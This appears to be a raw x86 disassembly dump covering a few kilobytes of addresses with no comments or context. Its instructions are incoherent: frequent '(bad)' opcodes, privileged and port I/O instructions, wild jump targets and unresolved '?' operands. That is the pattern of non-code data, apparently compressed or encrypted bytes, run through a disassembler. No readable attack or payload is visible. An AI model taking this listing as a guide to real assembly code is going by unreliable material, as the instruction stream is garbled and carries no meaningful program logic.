  4194f0:	mov    edx,0xce1869b
  4194f5:	sub    eax,esp
  4194f7:	(bad)  
  4194f8:	addr16 xchg esi,eax
  4194fa:	mov    eax,0x9bef4948
  4194ff:	dec    esi
  419500:	jns    0x41956f
  419502:	cmp    ebp,DWORD PTR [ebp-0x35]
  419505:	mov    DWORD PTR [ebx],ebx
  419507:	pop    esp
  419508:	mov    bh,0x93
  41950a:	push   ds
  41950b:	ret    0x9e73
  41950e:	push   cs
  41950f:	stos   BYTE PTR es:[edi],al
  419510:	and    al,0x3
  419512:	(bad)  
  419513:	xlat   BYTE PTR ds:[ebx]
  419514:	pop    es
  419515:	pop    ecx
  419516:	jnp    0x41958f
  419518:	or     dh,ah
  41951a:	cmps   BYTE PTR ss:[esi],BYTE PTR es:[edi]
  41951c:	retf   
  41951d:	mov    ebp,0xafb57e34
  419522:	adc    ebx,edi
  419524:	retf   
  419525:	jmp    0xc64ac94d
  41952a:	adc    al,0x21
  41952c:	enter  0x960d,0xc1
  419530:	nop
  419531:	jbe    0x4194d0
  419533:	dec    ebx
  419534:	std    
	...
  419595:	add    BYTE PTR [edi-0x9d722c],ch
  41959b:	jnp    0x41958c
  41959d:	fnsave [ebx-0xf]
  4195a0:	xchg   esi,eax
  4195a1:	test   BYTE PTR [edi-0x7c0111f1],0xa
  4195a8:	add    DWORD PTR [eax],eax
  4195aa:	pop    es
  4195ab:	add    DWORD PTR [eax],eax
  4195ad:	add    BYTE PTR [ebx],bh
  4195af:	aaa    
  4195b0:	mov    ecx,gs
  4195b2:	por    mm1,QWORD PTR [esi+0x7857be28]
  4195b9:	cmp    BYTE PTR [eax+0x6b],dh
  4195bc:	pop    ss
  4195bd:	sbb    eax,0x4047f8ea
  4195c2:	push   edi
  4195c3:	mov    ebx,0x2c3673d4
  4195c8:	or     eax,0x7718466d
  4195cd:	xchg   ebx,eax
  4195ce:	cmp    dl,ch
  4195d0:	aas    
  4195d1:	fstp   DWORD PTR [edx+0xca895b7]
  4195d7:	xor    eax,0x5052d4f5
  4195dc:	add    BYTE PTR [eax],bh
  4195de:	xor    esp,DWORD PTR [edx+eax*8-0x4c393e54]
  4195e5:	jmp    0x3a07cc72
  4195ea:	inc    ebp
  4195eb:	int    0x8c
  4195ed:	sub    edi,DWORD PTR [edi-0x22]
  4195f0:	pop    ebx
  4195f1:	sub    al,0x96
  4195f3:	mov    dh,BYTE PTR [edi+0x3c16575]
  4195f9:	pusha  
  4195fa:	nop
  4195fb:	jno    0x4195d8
  4195fd:	lock xchg edi,eax
  4195ff:	lods   eax,DWORD PTR ds:[esi]
  419600:	or     ebp,DWORD PTR [edi-0x5df17e2e]
  419606:	adc    BYTE PTR [esi+esi*8+0x649d7d09],dh
  41960d:	pop    ebp
  41960e:	pop    eax
  41960f:	repnz push es
  419611:	pusha  
  419612:	mov    WORD PTR [esi+0x38],gs
  419615:	pop    ebp
  419616:	mov    ebp,0xc3770634
  41961b:	popf   
  41961c:	pushf  
  41961d:	sub    DWORD PTR [ebp-0x6f3f1200],ecx
  419623:	and    BYTE PTR [ecx],al
  419625:	cdq    
  419626:	xchg   ecx,eax
  419627:	sub    dl,BYTE PTR [edi-0x4]
  41962a:	cdq    
  41962b:	es add edi,0x42
  41962f:	adc    esp,0xfc3908c7
  419635:	inc    edx
  419636:	xor    cl,ah
  419638:	(bad)  
  41963a:	cdq    
  41963b:	inc    eax
  41963c:	and    DWORD PTR [edi-0xa],0x55
  419640:	adc    edx,edi
  419642:	or     ah,BYTE PTR [edi+edi*1]
  419645:	cdq    
  419646:	add    BYTE PTR [edx],bh
  419648:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  419649:	(bad)  
  41964b:	or     eax,DWORD PTR [ebx]
  41964d:	sbb    eax,0xb55b510c
  419652:	jns    0x4196b0
  419654:	mov    DWORD PTR ds:0xe2c18c10,esp
  41965a:	jmp    0x4196a3
  41965c:	hlt    
  41965d:	inc    ebp
  41965e:	ins    BYTE PTR es:[edi],dx
  41965f:	out    dx,al
  419660:	sbb    DWORD PTR [edx-0x3e],esp
  419663:	jg     0x41960a
  419665:	inc    ecx
  419666:	sbb    edi,DWORD PTR [edx+0x70]
  419669:	pushw  ss
  41966b:	jae    0x4196cc
  41966d:	(bad)  
  41966e:	push   0x81ca0cb2
  419673:	rol    DWORD PTR [esi],1
  419675:	push   di
  419677:	shr    DWORD PTR [ecx+0x30],cl
  41967a:	mov    ebx,0x41ae2360
  41967f:	cli    
  419680:	cli    
  419681:	or     eax,DWORD PTR [edi-0x41]
  419684:	xchg   ebp,eax
  419685:	xor    DWORD PTR [edx+0x2b],ebp
  419688:	fs pushf 
  41968a:	in     eax,dx
  41968b:	mov    dh,BYTE PTR [esi+0x65]
  41968e:	inc    ebx
  41968f:	in     al,dx
  419690:	jmp    0x86228580
  419695:	push   eax
  419696:	inc    edi
  419697:	cwde   
  419698:	jbe    0x4196fb
  41969a:	add    ebp,DWORD PTR [esi+eax*8]
  41969d:	xchg   ebx,eax
  41969e:	push   ebx
  41969f:	pop    esi
  4196a0:	push   edx
  4196a1:	jb     0x419668
  4196a3:	add    BYTE PTR [esi-0x7b],0x6b
  4196a7:	in     eax,0xef
  4196a9:	pop    esi
  4196aa:	hlt    
  4196ab:	lea    esi,[edx+0x589695c6]
  4196b1:	pop    ecx
  4196b2:	mov    edi,0xa737
	...
  419713:	add    BYTE PTR [eax],al
  419715:	add    BYTE PTR [ebx-0x29a8ec1],dh
  41971b:	outs   dx,DWORD PTR ds:[esi]
  41971c:	mov    bh,0xff
  41971e:	inc    ebp
  41971f:	loop   0x419766
  419721:	dec    esp
  419722:	cdq    
  419723:	std    
  419724:	xor    dh,dh
  419726:	mov    cl,BYTE PTR [ebx]
  419728:	add    DWORD PTR [eax],eax
  41972a:	pop    es
  41972b:	add    DWORD PTR [eax],eax
  41972d:	add    BYTE PTR [esi+ecx*2],ah
  419730:	xor    al,dh
  419732:	imul   edx,edx,0x72
  419735:	dec    edx
  419736:	mov    ebx,0xf4778e55
  41973b:	lods   eax,DWORD PTR ds:[esi]
  41973c:	std    
  41973d:	pop    edi
  41973e:	test   ebp,eax
  419740:	pop    es
  419741:	retf   0x2779
  419744:	jge    0x419793
  419746:	fdivp  st(7),st
  419748:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  419749:	add    BYTE PTR [ebp+0x5],bh
  41974c:	inc    esp
  41974d:	rol    DWORD PTR [ebp+0x1025719a],0x3a
  419754:	in     al,dx
  419755:	ds sub al,0xed
  419758:	and    BYTE PTR [edi],ch
  41975a:	in     al,0x92
  41975c:	adc    BYTE PTR [ebp+0x5a46a0b5],bl
  419762:	sbb    al,0xdb
  419764:	mov    edx,0x65e57a79
  419769:	dec    esi
  41976a:	retf   
  41976b:	add    eax,0x7003b417
  419770:	outs   dx,BYTE PTR ds:[esi]
  419771:	dec    edi
  419772:	mov    al,ds:0xfb26001e
  419777:	xlat   BYTE PTR ds:[ebx]
  419778:	adc    eax,0xa0566858
  41977d:	clc    
  41977e:	fdiv   DWORD PTR [ebx+0x49]
  419781:	daa    
  419782:	js     0x41972a
  419784:	mov    dh,BYTE PTR [esi+0x46cb5c69]
  41978a:	repnz inc eax
  41978c:	shl    BYTE PTR [edi-0x1a],cl
  41978f:	les    esp,FWORD PTR [ebp-0x4c]
  419792:	fisttp DWORD PTR [ebx+0x6d]
  419795:	add    ebx,DWORD PTR [ebx]
  419797:	leave  
  419798:	adc    DWORD PTR [ebp-0x41],eax
  41979b:	xchg   DWORD PTR [esi+0x5b3adbf0],esi
  4197a1:	ja     0x419727
  4197a3:	les    esp,FWORD PTR [ebx+0x7bd826d4]
  4197a9:	enter  0x27ac,0xf
  4197ad:	idiv   DWORD PTR ds:0xef0e65d9
  4197b3:	mov    ch,0xdf
  4197b5:	repz add BYTE PTR [edi],dh
  4197b8:	dec    eax
  4197b9:	cmp    BYTE PTR [ecx+0x105ecea1],dh
  4197bf:	push   esi
  4197c0:	fnstsw ax
  4197c2:	pop    esi
  4197c3:	mov    edx,0xf14f819
  4197c8:	push   es
  4197c9:	add    BYTE PTR [ebp+0x67],al
  4197cc:	(bad)  
  4197cd:	out    0xce,al
  4197cf:	hlt    
  4197d0:	and    ch,BYTE PTR [ebx-0x14]
  4197d3:	mov    esi,0x7572a70c
  4197d8:	or     al,0xf9
  4197da:	jg     0x419834
  4197dc:	out    dx,ax
  4197de:	addr16 mov dh,0xa1
  4197e1:	cmp    eax,0x698b69c7
  4197e6:	mov    edx,0x9d5bc636
  4197eb:	shl    DWORD PTR [ebp+0x7],cl
  4197ee:	inc    esi
  4197ef:	jle    0x4197ba
  4197f1:	mov    al,ds:0x225e0f77
  4197f6:	adc    eax,0x2f17aecd
  4197fb:	sbb    bh,BYTE PTR [ebp+esi*8-0x6b]
  4197ff:	lods   al,BYTE PTR ds:[esi]
  419800:	in     eax,dx
  419801:	in     al,dx
  419802:	xchg   BYTE PTR [edx],bl
  419804:	rcr    BYTE PTR ss:[esi+ebx*4-0x65],0xcc
  41980a:	push   ebp
  41980b:	ret    
  41980c:	xchg   ebp,eax
  41980d:	and    DWORD PTR [eax],edx
  41980f:	push   cs
  419810:	hlt    
  419811:	in     eax,0x28
  419813:	push   0x56
  419815:	jle    0x4197ff
  419817:	outs   dx,BYTE PTR ds:[esi]
  419818:	sub    al,0x57
  41981a:	loopne 0x4197cb
  41981c:	xchg   esp,eax
  41981d:	inc    ecx
  41981e:	ins    DWORD PTR es:[edi],dx
  41981f:	test   al,0x8a
  419821:	imul   ebx,DWORD PTR [eax+eiz*2+0x6afb0d56],0x8934e730
  41982c:	data16 mov al,ds:0x510ea45c
  419832:	js     0x41984d
  419834:	mov    eax,0x0
	...
  419895:	add    BYTE PTR [edx-0x201eb8e7],al
  41989b:	jmp    DWORD PTR [esi-0x4a285f85]
  4198a1:	fiadd  DWORD PTR [ebp-0x6ef0e105]
  4198a7:	or     al,0x1
  4198a9:	add    BYTE PTR [edi],al
  4198ab:	add    DWORD PTR [eax],eax
  4198ad:	add    BYTE PTR [ecx],dh
  4198af:	repz mov eax,ds:0x3108d1e5
  4198b5:	mov    al,0x9f
  4198b7:	mov    ebx,0xa764b03a
  4198bc:	icebp  
  4198bd:	int    0xf3
  4198bf:	(bad)  
  4198c0:	cmp    BYTE PTR [edi],bh
  4198c2:	ret    
  4198c3:	sub    al,BYTE PTR [esp+edx*1]
  4198c6:	xor    al,0xcc
  4198c8:	(bad)  
  4198c9:	(bad)  
  4198ca:	pop    esi
  4198cb:	out    dx,eax
  4198cc:	pop    edi
  4198cd:	adc    al,0x17
  4198cf:	mov    BYTE PTR [ebp+0x11],ah
  4198d2:	pop    esp
  4198d3:	or     ecx,0xffffffdd
  4198d6:	jg     0x419916
  4198d8:	fwait
  4198d9:	mov    ds:0xacad2980,eax
  4198de:	inc    ecx
  4198df:	mov    ds:0xfeb1e285,eax
  4198e4:	inc    esp
  4198e5:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  4198e6:	lds    edi,FWORD PTR [edx+0x5d64957f]
  4198ec:	xchg   DWORD PTR [edi+0x83ef3d8],esp
  4198f2:	adc    dl,BYTE PTR [eax+0x33a0a327]
  4198f8:	mov    DWORD PTR gs:[edx+0x49],0xddff23bc
  419900:	xchg   edx,eax
  419901:	arpl   WORD PTR fs:[edi+0x2],sp
  419905:	pop    es
  419906:	or     dh,bl
  419908:	mov    ch,0x98
  41990a:	pop    es
  41990b:	es mov eax,0x59d2a843
  419911:	pusha  
  419912:	sub    eax,0xaed80cc9
  419917:	jecxz  0x419981
  419919:	popf   
  41991a:	xor    al,0x57
  41991c:	(bad)  
  41991d:	outs   dx,DWORD PTR ds:[esi]
  41991e:	stos   BYTE PTR es:[edi],al
  41991f:	into   
  419920:	adc    eax,0x3ff94168
  419925:	push   ecx
  419926:	mov    eax,ds:0xee7fb2a7
  41992b:	mov    esi,0x521ecf6f
  419930:	mov    cl,BYTE PTR ds:0x176552f2
  419936:	cld    
  419937:	sbb    BYTE PTR [edx+0x59],ch
  41993a:	test   ch,ch
  41993c:	jg     0x41998a
  41993e:	mov    DWORD PTR [edi],eax
  419940:	sbb    eax,0xafe51474
  419945:	push   ebx
  419946:	sar    BYTE PTR [edi+edx*1],1
  419949:	mov    ch,0x91
  41994b:	jecxz  0x4199b7
  41994d:	xlat   BYTE PTR ds:[ebx]
  41994e:	inc    ecx
  41994f:	es mov edi,0xb88a330d
  419955:	xor    eax,0x8eff0136
  41995a:	ins    BYTE PTR es:[edi],dx
  41995b:	aaa    
  41995c:	ds push ecx
  41995e:	idiv   BYTE PTR [edi-0x50]
  419961:	xchg   ebp,eax
  419962:	add    al,0x1b
  419964:	stos   DWORD PTR es:[edi],eax
  419965:	(bad)  
  419966:	sub    DWORD PTR [esi-0x1e],edx
  419969:	sbb    al,0xdf
  41996b:	and    esi,esp
  41996d:	sub    BYTE PTR [esi+ebp*2],dh
  419970:	test   BYTE PTR [ebp+0x25ee071f],0x1b
  419977:	xchg   DWORD PTR [edi-0x3a5419ee],eax
  41997d:	mov    bh,0x5c
  41997f:	mov    ch,0x63
  419981:	mov    ds:0xc3f83829,eax
  419986:	xor    ebp,DWORD PTR [edx+ecx*4]
  419989:	mov    cl,dl
  41998b:	mov    cl,0xb4
  41998d:	xchg   edi,eax
  41998e:	fnstenv [ecx]
  419990:	sbb    BYTE PTR [ebp-0x7caec8ba],0x58
  419997:	mov    edx,0x907bfa52
  41999c:	mov    cl,0xef
  41999e:	pop    esi
  41999f:	sbb    BYTE PTR [edi+esi*2+0x2b],bh
  4199a3:	daa    
  4199a4:	cmp    ecx,edx
  4199a6:	cmp    eax,0xcd6df2a3
  4199ab:	jno    0x419971
  4199ad:	fsubrp st(0),st
  4199af:	bound  eax,QWORD PTR [edx]
  4199b1:	ins    BYTE PTR es:[edi],dx
  4199b2:	sub    ebp,esi
  4199b4:	sub    BYTE PTR [eax],al
	...
  419a16:	xor    esi,DWORD PTR [ecx]
  419a18:	xchg   ebx,eax
  419a19:	lds    edx,FWORD PTR [ebx+0x59f777e7]
  419a1f:	push   ss
  419a20:	mov    eax,ds:0x8d6cca09
  419a25:	dec    esi
  419a26:	cwde   
  419a27:	or     eax,0x1070001
  419a2c:	add    BYTE PTR [eax],al
  419a2e:	mov    al,0xb8
  419a30:	mov    es,WORD PTR [edi]
  419a32:	jnp    0x419a01
  419a34:	pop    edi
  419a35:	push   ds
  419a36:	je     0x4199c4
  419a38:	xor    al,0xc9
  419a3a:	add    eax,0x1c908d3e
  419a3f:	test   eax,0x789e29d2
  419a44:	fisttp WORD PTR [esi]
  419a46:	push   ebx
  419a47:	sbb    al,0xcd
  419a49:	lea    esi,[ebx-0x10c53ffa]
  419a4f:	xchg   edi,eax
  419a50:	adc    al,0x20
  419a52:	sub    BYTE PTR [ecx-0x8],bh
  419a55:	or     ch,al
  419a57:	and    eax,DWORD PTR [esi+0x25]
  419a5a:	dec    esp
  419a5b:	mov    edx,esi
  419a5d:	cmp    ecx,DWORD PTR [eax+eax*1+0x2f4205c4]
  419a64:	jno    0x419a77
  419a66:	jecxz  0x419a99
  419a68:	push   esi
  419a69:	repz sbb DWORD PTR [edx],edi
  419a6c:	test   DWORD PTR [esi+0x42],esi
  419a6f:	fwait
  419a70:	adc    DWORD PTR [ebx+0x4eeb8200],edx
  419a76:	mov    ebp,0xcc47cada
  419a7b:	pop    ebx
  419a7c:	push   edi
  419a7d:	add    eax,0x941c00ef
  419a82:	sahf   
  419a83:	inc    ebx
  419a84:	imul   ebp,DWORD PTR [edx],0xffffff8f
  419a87:	sahf   
  419a88:	pop    edx
  419a89:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  419a8a:	jmp    0x17de97ce
  419a8f:	jl     0x419a6d
  419a91:	(bad)  
  419a92:	fisttp WORD PTR [edi]
  419a94:	add    BYTE PTR [edi],ah
  419a96:	adc    DWORD PTR [ecx+0x56],esp
  419a99:	ins    DWORD PTR es:[edi],dx
  419a9a:	inc    edx
  419a9b:	inc    DWORD PTR ds:0x4fcfa047
  419aa1:	call   0x112ab6e3
  419aa6:	into   
  419aa7:	or     BYTE PTR ds:0x2c6f8ef8,ch
  419aad:	mov    ch,0x46
  419aaf:	and    DWORD PTR [ebx+edi*8+0x6f973653],ebx
  419ab6:	mov    al,ds:0x748bec19
  419abb:	retf   0xe06
  419abe:	outs   dx,DWORD PTR ds:[esi]
  419abf:	and    DWORD PTR [ecx-0x2de6b239],0x58
  419ac6:	dec    edx
  419ac7:	(bad)  
  419ac8:	mov    ebx,?
  419aca:	dec    ebp
  419acb:	sbb    DWORD PTR [esi],ebx
  419acd:	test   BYTE PTR [esi+0x516aff40],ch
  419ad3:	pop    esp
  419ad4:	out    0xf9,eax
  419ad6:	pusha  
  419ad7:	mov    eax,0xdfee8f07
  419adc:	cmpxchg DWORD PTR [esp+ebp*8+0xb33bfb8],esi
  419ae4:	sbb    eax,0x8aa07222
  419ae9:	outs   dx,BYTE PTR ds:[esi]
  419aea:	sub    DWORD PTR [edx+ebx*8+0x19548e7b],eax
  419af1:	test   DWORD PTR [edi+0x77],edx
  419af4:	pop    ebx
  419af5:	clc    
  419af6:	pusha  
  419af7:	jne    0x419b2b
  419af9:	or     ah,ch
  419afb:	ret    0x775a
  419afe:	out    0x71,eax
  419b00:	cld    
  419b01:	ret    
  419b02:	fdiv   DWORD PTR [ebp-0x496fe5bd]
  419b08:	cwde   
  419b09:	imul   DWORD PTR [ebx-0x450e3a9f]
  419b0f:	das    
  419b10:	test   DWORD PTR es:[edx-0x613ccf25],0x63b6e13e
  419b1b:	mov    al,ds:0x967977ea
  419b20:	(bad)  
  419b21:	out    dx,al
  419b22:	cmp    esi,esi
  419b24:	or     esi,DWORD PTR [eax]
  419b26:	pop    esp
  419b27:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  419b28:	rcr    ebx,1
  419b2a:	mov    ?,edx
  419b2c:	push   0x1f
  419b2e:	adc    DWORD PTR [edi],edx
  419b30:	cmp    esp,edi
  419b32:	dec    esi
  419b33:	fadd   DWORD PTR [edx+0x0]
	...
  419b95:	add    BYTE PTR [edx-0x3c],cl
  419b98:	cli    
  419b99:	inc    edi
  419b9a:	(bad)  
  419b9b:	jg     0x419b9c
  419b9d:	int    0xb7
  419b9f:	cs aam 0x47
  419ba2:	fidiv  WORD PTR [ecx+0xe9f35a7]
  419ba8:	add    DWORD PTR [eax],eax
  419baa:	pop    es
  419bab:	add    DWORD PTR [eax],eax
  419bad:	add    BYTE PTR [esi+ebx*1-0x21],cl
  419bb1:	pop    ebp
  419bb2:	fild   QWORD PTR [ebp+0x32518d8]
  419bb8:	ss cmp al,0x81
  419bbb:	jb     0x419c07
  419bbd:	dec    edx
  419bbe:	shl    DWORD PTR [eax+0x622b0255],1
  419bc4:	aam    0x8a
  419bc6:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  419bc7:	inc    BYTE PTR [ecx+0x28]
  419bca:	jbe    0x419b7a
  419bcc:	test   eax,0x8bcdfa09
  419bd1:	ror    BYTE PTR [edi+0x56],0xfd
  419bd5:	mov    ds:0x422bce1a,eax
  419bda:	data16 (bad) 
  419bdd:	ret    0x1914
  419be0:	outs   dx,BYTE PTR ds:[esi]
  419be1:	ficom  WORD PTR [eax-0x31]
  419be4:	inc    edi
  419be5:	mov    eax,ds:0xc806088e
  419bea:	imul   esp,DWORD PTR [ecx+esi*2-0x7e],0xffffffde
  419bef:	std    
  419bf0:	add    al,0x95
  419bf2:	(bad)  
  419bf4:	push   0x5571afb8
  419bf9:	jmp    0x419bc9
  419bfb:	mov    ds,esi
  419bfd:	push   0x4c21e4b4
  419c02:	and    BYTE PTR [eax-0x50],dl
  419c05:	mov    ds:0x24b4c0cb,eax
  419c0a:	mov    edi,0xf8456682
  419c0f:	ror    DWORD PTR [esi+0x7fd7587b],cl
  419c15:	or     DWORD PTR [ecx-0x6b],ecx
  419c18:	jbe    0x419c22
  419c1a:	pop    edx
  419c1b:	sub    edi,DWORD PTR gs:[eax+0x32]
  419c1f:	ins    DWORD PTR es:[edi],dx
  419c20:	cmp    al,dl
  419c22:	shr    DWORD PTR [edi],1
  419c24:	scas   eax,DWORD PTR es:[edi]
  419c25:	cmp    DWORD PTR [edx-0x2a9eca8e],eax
  419c2b:	or     al,0x85
  419c2d:	and    BYTE PTR [ebx+0x5],cl
  419c30:	push   es
  419c31:	out    dx,al
  419c32:	aaa    
  419c33:	(bad)  
  419c35:	jmp    0x52d4:0x9e5287b7
  419c3c:	cmp    DWORD PTR [edx-0x76c347bd],ebp
  419c42:	call   0xb5786c5
  419c47:	fst    QWORD PTR [esi+0xc]
  419c4a:	fidivr DWORD PTR [ecx-0x30]
  419c4d:	xor    BYTE PTR [ecx],0xdd
  419c50:	xchg   al,bh
  419c52:	mov    ah,0xde
  419c54:	(bad)  
  419c55:	jmp    0x67c30228
  419c5a:	pop    ebx
  419c5b:	inc    esp
  419c5c:	inc    dl
  419c5e:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  419c5f:	mov    ebp,ebp
  419c61:	mov    esp,0x31b09c70
  419c66:	je     0x419c29
  419c68:	inc    edx
  419c69:	ret    
  419c6a:	pop    ebp
  419c6b:	xchg   DWORD PTR ds:0x24392c5c,ebx
  419c71:	sbb    DWORD PTR [eax-0x55],esi
  419c74:	lds    esi,FWORD PTR [ecx]
  419c76:	sbb    esi,0x8d70a25a
  419c7c:	xor    al,0x7
  419c7e:	fcompp 
  419c80:	mov    eax,0xbe3dd07c
  419c85:	call   0x2096cc09
  419c8a:	js     0x419c7b
  419c8c:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  419c8d:	pop    es
  419c8e:	sahf   
  419c8f:	jecxz  0x419d02
  419c91:	sbb    DWORD PTR [ebp+edx*8-0x4c6f3134],0xffffffc1
  419c99:	xchg   DWORD PTR [edx-0x7b],ecx
  419c9c:	sub    al,0x77
  419c9e:	add    ebp,edi
  419ca0:	fiadd  DWORD PTR [ecx+edx*4-0x10]
  419ca4:	shr    BYTE PTR [edi],1
  419ca6:	cmps   DWORD PTR cs:[esi],DWORD PTR es:[edi]
  419ca8:	or     ebp,edx
  419caa:	out    dx,al
  419cab:	test   al,0xba
  419cad:	mov    cl,0x60
  419caf:	popa   
  419cb0:	lahf   
  419cb1:	sub    DWORD PTR [edx-0x5d],esi
  419cb4:	hlt    
	...
  419d15:	add    al,dh
  419d17:	xchg   edi,eax
  419d18:	std    
  419d19:	cmp    al,0xff
  419d1b:	jle    0x419d0e
  419d1d:	fistp  WORD PTR [eax]
  419d1f:	push   0x82709c45
  419d24:	pop    ss
  419d25:	aam    0xa6
  419d27:	sgdtd  [eax]
  419d2a:	pop    es
  419d2b:	add    DWORD PTR [eax],eax
  419d2d:	add    BYTE PTR [ebx],ah
  419d2f:	jge    0x419d34
  419d31:	adc    BYTE PTR [ebx],dh
  419d33:	in     al,0xfc
  419d35:	adc    BYTE PTR [esi+edi*1+0x5d1fdea8],al
  419d3c:	dec    ebx
  419d3d:	and    DWORD PTR ss:[ecx],ecx
  419d40:	inc    esi
  419d41:	xchg   ebp,eax
  419d42:	sub    al,0x47
  419d44:	pop    edx
  419d45:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  419d46:	ret    
  419d47:	push   edi
  419d48:	jle    0x419d5e
  419d4a:	sbb    al,0x3
  419d4c:	addr16 inc edx
  419d4e:	inc    ebp
  419d4f:	sbb    DWORD PTR [ecx+0x2eb37b8c],ebp
  419d55:	cmp    BYTE PTR [eax],ah
  419d57:	cmp    eax,0x22a467bc
  419d5c:	pushf  
  419d5d:	inc    edx
  419d5e:	push   0x3ca17a2b
  419d63:	out    dx,al
  419d64:	and    edx,esp
  419d66:	inc    ebp
  419d67:	jg     0x419d4e
  419d69:	pop    ebx
  419d6a:	fbstp  TBYTE PTR [eax+0x1d]
  419d6d:	bound  edx,QWORD PTR [eax+0xff0f8e3]
  419d73:	mov    edx,DWORD PTR [edx]
  419d75:	pusha  
  419d76:	std    
  419d77:	or     DWORD PTR [esi+0x52610701],edx
  419d7d:	mov    ebx,0x1e0a76a9
  419d82:	lods   eax,DWORD PTR ds:[esi]
  419d83:	test   ah,dh
  419d85:	loop   0x419d67
  419d87:	push   ecx
  419d88:	lods   al,BYTE PTR ds:[esi]
  419d89:	sbb    bl,BYTE PTR [esi]
  419d8b:	xchg   DWORD PTR [esi],ebx
  419d8d:	jae    0x419e07
  419d8f:	jg     0x419d25
  419d91:	sbb    DWORD PTR [eax-0x6d],ecx
  419d94:	ja     0x419e13
  419d96:	mov    esp,0x768d6314
  419d9b:	or     esp,0xfffffff8
  419d9e:	in     al,dx
  419d9f:	int    0xce
  419da1:	in     eax,0xa4
  419da3:	retf   0xc5b7
  419da6:	dec    BYTE PTR [eax+0x58275244]
  419dac:	lock cmp BYTE PTR [edi],cl
  419daf:	mov    ch,0x5e
  419db1:	push   0xffffffe2
  419db3:	data16 into 
  419db5:	mov    bl,BYTE PTR [ecx-0x13]
  419db8:	loop   0x419de4
  419dba:	daa    
  419dbb:	jmp    0x419d5b
  419dbd:	lahf   
  419dbe:	aas    
  419dbf:	cmp    al,0x81
  419dc1:	in     eax,0xf3
  419dc3:	popa   
  419dc4:	sbb    BYTE PTR [esi-0x3fad967c],ah
  419dca:	js     0x419db9
  419dcc:	or     edx,edx
  419dce:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  419dcf:	sub    BYTE PTR [ebx+ebp*8+0x45452667],al
  419dd6:	jmp    0xd81fc552
  419ddb:	xlat   BYTE PTR ds:[ebx]
  419ddc:	mov    al,ds:0xf008ff32
  419de1:	icebp  
  419de2:	lea    ecx,[edi+0x7a]
  419de5:	adc    BYTE PTR ds:[ebx-0x1f],0x2c
  419dea:	test   DWORD PTR [esi-0x65],ebp
  419ded:	mov    cl,0x3e
  419def:	ret    
  419df0:	in     al,0xb
  419df2:	inc    edi
  419df3:	stc    
  419df4:	mov    cl,0xc4
  419df6:	xor    DWORD PTR [edi+edi*2],ebp
  419df9:	jmp    0x419e25
  419dfb:	push   cs
  419dfc:	push   cs
  419dfd:	mov    bh,0x3c
  419dff:	push   ebp
  419e00:	or     DWORD PTR [edi+0x33],ebp
  419e03:	(bad)  
  419e04:	jge    0x419dfa
  419e06:	mov    al,0xad
  419e08:	cmp    esi,DWORD PTR [edi-0x5fdd9d7f]
  419e0e:	xchg   ebx,eax
  419e0f:	out    0x4c,al
  419e11:	pop    ss
  419e12:	dec    edi
  419e13:	aas    
  419e14:	fs lock pop eax
  419e17:	scas   al,BYTE PTR es:[edi]
  419e18:	push   ecx
  419e19:	mov    al,ds:0x9df0e89f
  419e1e:	cmp    ebx,ebx
  419e20:	in     eax,0xd9
  419e22:	sub    cl,BYTE PTR [eax]
  419e24:	into   
  419e25:	sbb    ah,BYTE PTR ds:[ecx-0x27323649]
  419e2c:	push   ss
  419e2d:	mov    edx,0xee325575
  419e32:	or     eax,0x48fd
	...
  419e93:	add    BYTE PTR [eax],al
  419e95:	add    BYTE PTR [edi+0x5fc517d8],al
  419e9b:	iret   
  419e9c:	xlat   BYTE PTR ds:[ebx]
  419e9d:	fimul  DWORD PTR [eax+0x50c5a0]
  419ea3:	xor    eax,0x10ad0187
  419ea8:	add    DWORD PTR [eax],eax
  419eaa:	pop    es
  419eab:	add    DWORD PTR [eax],eax
  419ead:	add    BYTE PTR [ebp+0x66a78794],bh
  419eb3:	xchg   ebx,eax
  419eb4:	cdq    
  419eb5:	sub    esi,DWORD PTR [edx-0x51]
  419eb8:	stos   BYTE PTR es:[edi],al
  419eb9:	es (bad) 
  419ebb:	dec    esi
  419ebc:	inc    edi
  419ebd:	fmul   st(1),st
  419ebf:	inc    eax
  419ec0:	and    DWORD PTR [ebx-0x19a14418],ecx
  419ec6:	push   edx
  419ec7:	pop    edi
  419ec8:	test   BYTE PTR [ebp-0x63],0xb2
  419ecc:	xchg   esp,eax
  419ecd:	mov    edx,DWORD PTR [edi]
  419ecf:	(bad)  
  419ed0:	mov    esp,0xfe39dc8d
  419ed5:	mov    eax,ds:0x4afdc4fd
  419eda:	jne    0x419ee4
  419edc:	je     0x419f0c
  419ede:	mov    esi,0x8646b65c
  419ee3:	or     eax,0xe0b6cd1c
  419ee8:	stc    
  419ee9:	cmp    esp,DWORD PTR [ecx]
  419eeb:	mov    BYTE PTR [ecx+eiz*8-0xa],bl
  419eef:	in     eax,dx
  419ef0:	jns    0x419f28
  419ef2:	inc    ecx
  419ef3:	push   ebp
  419ef4:	shl    DWORD PTR [ebx],0xdb
  419ef7:	shl    DWORD PTR [eiz*8-0x2a343399],cl
  419efe:	add    DWORD PTR [edx-0xa],eax
  419f01:	mov    esp,0xe2c4e0cc
  419f06:	mov    al,ds:0x1f02fca3
  419f0b:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  419f0c:	push   eax
  419f0d:	and    edx,DWORD PTR [esi+eiz*4]
  419f10:	push   ecx
  419f11:	jle    0x419eb2
  419f13:	mov    bh,0xb4
  419f15:	je     0x419efb
  419f17:	or     DWORD PTR [ebp-0x21c6c1c9],edi
  419f1d:	bound  ebp,QWORD PTR [esi+0x24]
  419f20:	ds repz xchg edi,eax
  419f23:	into   
  419f24:	imul   edi,DWORD PTR [ecx],0xffffff9e
  419f27:	mov    bl,0xa9
  419f29:	sub    BYTE PTR ds:0xcfac07e8,ch
  419f2f:	div    DWORD PTR [esi-0x4472ca77]
  419f35:	add    dl,BYTE PTR es:[ecx]
  419f38:	xchg   edi,eax
  419f39:	sbb    eax,DWORD PTR [esi]
  419f3b:	pop    edi
  419f3c:	adc    al,0x82
